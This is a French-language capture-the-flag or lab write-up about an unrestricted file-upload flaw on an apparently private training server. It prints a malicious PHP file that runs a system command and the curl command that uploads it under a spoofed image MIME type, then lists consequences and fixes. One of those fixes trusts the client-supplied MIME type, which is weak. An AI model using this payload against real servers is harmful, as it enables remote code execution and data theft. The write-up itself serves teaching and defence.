## Phase 1 : Découverte de la faille

### Analyse initiale
En analysant le site web, nous avons découvert une page d'upload accessible à l'adresse suivante :
```
http://10.14.200.61/?page=upload
```

Cette page contient un formulaire HTML permettant d'uploader des fichiers. Voici le code HTML du formulaire trouvé dans la page :

```html
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
    Choose an image to upload:
    <br />
    <input name="uploaded" type="file" /><br />
    <br />
    <input type="submit" name="Upload" value="Upload">
</form>
```

### Points importants observés :
1. **Champ `uploaded`** : Ce champ permet de sélectionner un fichier à uploader.
2. **Champ `Upload`** : Ce champ est un bouton de soumission qui envoie la requête POST.
3. **Absence de validation côté client** : Aucun mécanisme JavaScript ou HTML ne semble limiter les types de fichiers pouvant être uploadés.

### Hypothèse
Le serveur pourrait accepter des fichiers malveillants (comme des scripts PHP) déguisés en fichiers légitimes (par exemple, des images). Si ces fichiers sont exécutés après l'upload, cela pourrait permettre d'exécuter du code arbitraire sur le serveur.

---

## Phase 2 : Exploitation de la faille

### Étape 1 : Création d'un fichier PHP malveillant
Nous avons créé un fichier PHP nommé malicious.php contenant le code suivant :

```php
<?php
// Recherche la chaîne 'The flag is :' dans tous les fichiers accessibles
system("grep 'The flag is :' / -R 2>/dev/null");
echo "hello";
?>
```

#### Explication du code :
- **`system("grep 'The flag is :' / -R 2>/dev/null");`** :
  - Cette commande exécute `grep` pour rechercher la chaîne `"The flag is : "` dans tous les fichiers accessibles sur le serveur.
  - L'option `-R` effectue une recherche récursive dans tous les répertoires.
  - `2>/dev/null` redirige les erreurs vers null pour éviter d'afficher des messages d'erreur.
- **`echo "hello";`** :
  - Affiche un message simple pour confirmer que le script a été exécuté.

---

### Étape 2 : Envoi du fichier avec `curl`
Nous avons utilisé la commande suivante pour uploader le fichier malveillant :

```bash
curl -i -X POST -F Upload=Upload -F "uploaded=@./malicious.php;type=image/jpg" "http://10.14.200.61/?page=upload" | grep flag
```

#### Explication de la commande :
- **`-i`** : Inclut les en-têtes HTTP dans la réponse pour vérifier si l'upload a réussi.
- **`-X POST`** : Spécifie que la requête est une requête POST.
- **`-F Upload=Upload`** : Simule le clic sur le bouton de soumission du formulaire.
- **`-F "uploaded=@./malicious.php;type=image/jpg"`** :
  - Envoie le fichier malicious.php dans le champ `uploaded`.
  - Définit le type MIME comme `image/jpg` pour contourner les éventuelles validations côté serveur.
- **`"http://10.14.200.61/?page=upload"`** : URL de la page d'upload.
- **`| grep flag`** : Filtre la réponse pour afficher uniquement les lignes contenant le mot `flag`.

---

### Étape 3 : Résultat
Après avoir exécuté la commande, le serveur a accepté le fichier et l'a exécuté. La commande `grep` dans le fichier PHP a permis de localiser et d'afficher un flag présent sur le serveur.

---

## Phase 3 : Problèmes engendrés par cette faille

### Conséquences possibles
1. **Exécution de code arbitraire** :
   - Un attaquant peut exécuter des commandes système sur le serveur, ce qui peut compromettre l'intégrité et la sécurité du système.
   - Par exemple, il pourrait lire des fichiers sensibles comme passwd ou installer un backdoor.

2. **Vol de données sensibles** :
   - Si des fichiers contenant des informations sensibles (comme des mots de passe ou des clés API) sont accessibles, un attaquant peut les exfiltrer.

3. **Déni de service (DoS)** :
   - Un attaquant pourrait uploader un script qui consomme beaucoup de ressources, provoquant un crash du serveur.

4. **Escalade de privilèges** :
   - Si le serveur exécute le script avec des privilèges élevés, un attaquant pourrait prendre le contrôle total du système.

---

## Phase 4 : Comment corriger la faille

### 1. **Limiter les types de fichiers acceptés**
   - Vérifiez le type MIME et l'extension des fichiers uploadés côté serveur.
   - Par exemple, acceptez uniquement les fichiers images (`image/jpeg`, `image/png`) :
     ```php
     $allowed_types = ['image/jpeg', 'image/png'];
     if (!in_array($_FILES['uploaded']['type'], $allowed_types)) {
         die("Invalid file type.");
     }
     ```

### 2. **Renommer les fichiers uploadés**
   - Renommez les fichiers uploadés pour empêcher l'exécution de scripts malveillants :
     ```php
     $new_name = uniqid() . '.jpg';
     move_uploaded_file($_FILES['uploaded']['tmp_name'], "/uploads/" . $new_name);
     ```

### 3. **Désactiver l'exécution dans le répertoire d'upload**
   - Configurez le serveur pour empêcher l'exécution de fichiers dans le répertoire d'upload.
   - Exemple pour Apache (`.htaccess`) :
     ```
     <Directory "/path/to/uploads">
         php_flag engine off
     </Directory>
     ```

### 4. **Valider les entrées utilisateur**
   - Vérifiez toutes les entrées utilisateur pour éviter les injections ou les manipulations.

### 5. **Limiter les permissions du serveur**
   - Exécutez le serveur avec un utilisateur ayant des permissions minimales pour limiter les dégâts en cas de compromission.

---

## Conclusion
Cette faille d'upload de fichier est une vulnérabilité critique qui peut être exploitée pour exécuter du code arbitraire sur le serveur. En suivant les bonnes pratiques de sécurité (validation des fichiers, désactivation de l'exécution dans les répertoires d'upload, etc.), vous pouvez protéger votre application contre ce type d'attaque.

---